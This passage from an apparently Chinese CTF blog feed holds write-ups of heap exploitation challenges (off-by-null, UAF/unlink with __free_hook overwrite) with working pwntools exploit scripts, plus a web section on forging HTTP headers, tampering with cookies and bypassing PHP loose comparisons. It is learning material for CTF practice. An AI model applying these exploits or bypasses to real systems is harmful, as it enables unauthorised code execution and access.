class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x68</span>-i,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x68</span>-i))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">0x68</span>,cyclic(<span class="number">0x60</span>)+p64(<span class="number">0x4a0</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x420</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x10</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x60</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2be</span>,<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">onegadget = libc.address + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,cyclic(<span class="number">0x67</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
            <tag> off_by_null </tag>
            
            <tag> Glibc2.27 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP头伪造</title>
      <link href="/2024/11/09/HTTP%E5%A4%B4%E4%BC%AA%E9%80%A0/"/>
      <url>/2024/11/09/HTTP%E5%A4%B4%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>完成上课的web作业，顺便做一些记录。</p><p><mark>该部分主要是讲HTTP头的构造和cookie注入<mark></mark></mark></p><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>打开网站之后查看源码，发现：</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109132746031.bmp"></p><p>于是打开看看</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109132906519.bmp"></p><ul><li>很明显是要我们自己构造HTTP的请求头，这里分为两种工具，一个是<code>yakit</code>，还有个是浏览器<code>hackbar</code>插件(我用的是Google)</li></ul><h2 id="yakit抓包构造http请求头"><a href="#yakit抓包构造http请求头" class="headerlink" title="yakit抓包构造http请求头"></a>yakit抓包构造http请求头</h2><p><strong>1.修改访问网站</strong></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133225355.bmp"></p><p><strong>2.指定浏览器</strong></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133242400.bmp"></p><p><strong>3.从本地访问</strong></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133256897.bmp"></p><h2 id="hackbar修改http请求头"><a href="#hackbar修改http请求头" class="headerlink" title="hackbar修改http请求头"></a>hackbar修改http请求头</h2><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133626607.bmp"></p><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><ul><li>点开PAYFLAG页面查看源代码</li><li>要求如下，同时在源代码还隐藏着东西</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133940732.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133949465.bmp"></p><ul><li>要求我们进行<code>POST</code>请求发送password和money，并且password有如上的要求，先看抓包</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109134307454.bmp"></p><h2 id="修改cookie"><a href="#修改cookie" class="headerlink" title="修改cookie"></a>修改cookie</h2><ul><li>发现<code>Cookie</code>可以改，将user&#x3D;0修改为<code>user=1</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109134323295.bmp"></p><h2 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h2><ul><li>发现我们已经是学生了，下面修改password和money</li><li>注意要是POST请求，<code>yakit</code>右键可以直接改为POST请求</li><li>对于上述的password来说，输入纯数字会被判定为不通过，但是后面的比较是<code>==</code>，这是个弱比较，会在某些情况下将<code>$password</code>的类型隐式转换，即我们输入<code>404a</code>(404后面无所谓什么字符)<code>==</code>会略过非数字型，直接比较404，这样就绕过了判断。</li></ul><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109135045236.bmp"></p><h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><ul><li>显示money的长度过长，直接改为数组绕过:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109135409784.bmp"></p><blockquote><p>在 PHP 中，数组可以触发一些意想不到的宽松比较行为。因为在宽松比较下，PHP 会尝试将数组转换成其他类型进行比较，这样可以绕过某些验证条件。例如，在比较中，将数组与整数或字符串进行宽松比较时，PHP 的行为如下：</p><ol><li><p><strong>数组与整数比较</strong>：当数组和整数进行比较时，PHP 会将数组视为 <code>true</code>，即非空的数组在宽松比较中等价于 <code>true</code>。因此：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[] == <span class="number">0</span>  <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div><p>任何非空数组，比如 <code>[404]</code>，与整数进行比较时，PHP 会将数组视为 <code>true</code>，因此 <code>0 == true</code> 会被认为成立。</p></li></ol></blockquote><h1 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h1><ul><li>要求是admin登录，题目给了一个账号<code>cookie</code>密码是<code>monster</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109143732257.bmp"></p><ul><li>登陆后抓包看看:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109142343130.bmp"></p><ul><li>登录之后服务端会给我们设置<code>cookie</code>的值，那么我们在登录admin的时候<code>修改cookie</code>即可</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109144125524.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wdb_2018_1st_babyheap</title>
      <link href="/2024/11/08/wdb-2018-1st-babyheap/"/>
      <url>/2024/11/08/wdb-2018-1st-babyheap/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Glibc2.24 UAF Unlink</p><p>参考：<a class="link" href="https://www.cnblogs.com/LynneHuan/p/14876455.html">这篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>Unlink可以看我写的这个文章： <a href="http://downbeat.top/2024/09/25/zctf2016-note2-unlink/">http://downbeat.top/2024/09/25/zctf2016-note2-unlink/</a></p><h1 id="checksec-ida"><a href="#checksec-ida" class="headerlink" title="checksec+ida"></a>checksec+ida</h1><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwn@ctfpwn:~/Desktop/buuctf/wdb_2018_1st_babyheap$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/Desktop/buuctf/wdb_2018_1st_babyheap/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure></div><ul><li><p>NO PIE第一想法就是<code>Unlink</code></p></li><li><p>下面查看ida的结果(查看关键模块)</p></li></ul><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><ul><li>限制了每次malloc的size为0x20</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4009A0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0xF</span>uLL);</span><br><span class="line">  idx = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">9</span> &amp;&amp; !(&amp;ptr)[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    (&amp;ptr)[idx] = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    my_input((&amp;ptr)[idx], <span class="number">32LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><ul><li>只有三次修改的机会，并且只能修改0x20</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400A79</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x1F</span> &amp;&amp; (&amp;ptr)[v1] &amp;&amp; dword_6020B0 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    my_input((&amp;ptr)[v1], <span class="number">32LL</span>);</span><br><span class="line">    ++dword_6020B0;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><ul><li>可用来leak libc</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400C01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> &amp;&amp; (&amp;ptr)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>((&amp;ptr)[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><ul><li>很明显的UAF</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400B54</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> &amp;&amp; (&amp;ptr)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;ptr)[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><ol><li>由于限制了每次只能malloc(0x20)而且只能修改0x20的字节数，可以有<code>off_by_null</code>,但是这里给了UAF,并且在<code>glibc2.24</code>中<code>double free</code>的利用姿势十分简单，我们可以利用fastbin链表泄露chunk的地址，利用<code>double free</code>去构造一个<code>fake_chunk</code>,这个fake_chunk的<code>user_data</code>包含某个chunk的<code>prev_size和size</code>那么就可以实现<code>leak libc</code>和<code>unlink</code>了</li><li>同时这里限制了chunk的数量，相对于Aribitraty alloc很明显是不够的</li><li>这题目坑其实挺多的，在下面调试的时候慢慢说吧</li></ol><h1 id="题解-gdb"><a href="#题解-gdb" class="headerlink" title="题解&amp;gdb"></a>题解&amp;gdb</h1><h2 id="leak-heap-addr"><a href="#leak-heap-addr" class="headerlink" title="leak heap_addr"></a>leak heap_addr</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p32(<span class="number">0x31</span>)</span><br><span class="line">add(<span class="number">0</span>,payload) <span class="comment"># 构造fake_chunk准备</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">heapptr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x30</span></span><br><span class="line">lg(<span class="string">&quot;heap_ptr: &quot;</span>,heapptr)</span><br></pre></td></tr></table></figure></div><ul><li><mark>注意这个payload<mark></mark></mark></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p32(<span class="number">0x31</span>)</span><br></pre></td></tr></table></figure></div><p>最后不能是<code>p64</code>，因为是sendline发送的，自带<code>\n</code>，影响下一次的choice</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241108172801562.bmp"></p><ul><li>但其实后面无所谓是什么，即使不修改0x20的地方都没事</li></ul><h2 id="构造fake-chunk"><a href="#构造fake-chunk" class="headerlink" title="构造fake_chunk"></a>构造fake_chunk</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">5</span>,p64(heapptr+<span class="number">0x10</span>)) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">6</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">7</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure></div><ul><li>修改chunk1的fd指向chun0下方构造的fake_chunk</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241108173347173.bmp"></p><ul><li>下次malloc那么便会将这处<code>fake_chunk</code>给malloc走，那我们修改0x20正好可以修改chunk1的<code>prev_size和size</code>，同时我们也可以顺手布置unlink所需的条件，如下的payload</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x602060</span></span><br><span class="line">target = ptr + <span class="number">0x30</span></span><br><span class="line">payload = p64(target-<span class="number">0x18</span>) + p64(target-<span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p32(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">8</span>,payload) <span class="comment"># fake_chunk</span></span><br></pre></td></tr></table></figure></div><ul><li>对于target，由于0,1号chunk通过uaf连接的比较杂，所以我们可以选chunk3为目的chunk，unlink是修改某个heap为<code>target-0x18</code>，此时<code>target-0x18</code>是chunk3的地址，故…..</li></ul><h2 id="leak-libc-unlink"><a href="#leak-libc-unlink" class="headerlink" title="leak libc+unlink"></a>leak libc+unlink</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+<span class="string">b&quot;\x21&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">malloc_hook = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>-<span class="number">0x58</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br></pre></td></tr></table></figure></div><ul><li>为了Unlink我们还要修改fake_chunk的size&#x3D;0x21(下图是修改之前的)</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241108174432198.bmp"></p><ul><li><mark>为什么不在一开始就修改为0x20?<mark></mark></mark></li></ul><p>因为在fastbin中会对处于同一个bin的size进行检查，之前是将fake_chunk链在size&#x3D;0x31的fastbin上，所以要将size设置为0x31，此时要unlink，所以设置为0x21</p><h2 id="ezUnlink运用"><a href="#ezUnlink运用" class="headerlink" title="ezUnlink运用"></a>ezUnlink运用</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">6</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">edit(<span class="number">3</span>,p64(libc.address+<span class="number">0x4527a</span>)) <span class="comment">#+0x4527a</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>实现unlink之后的布局</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241108174925290.bmp"></p><h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   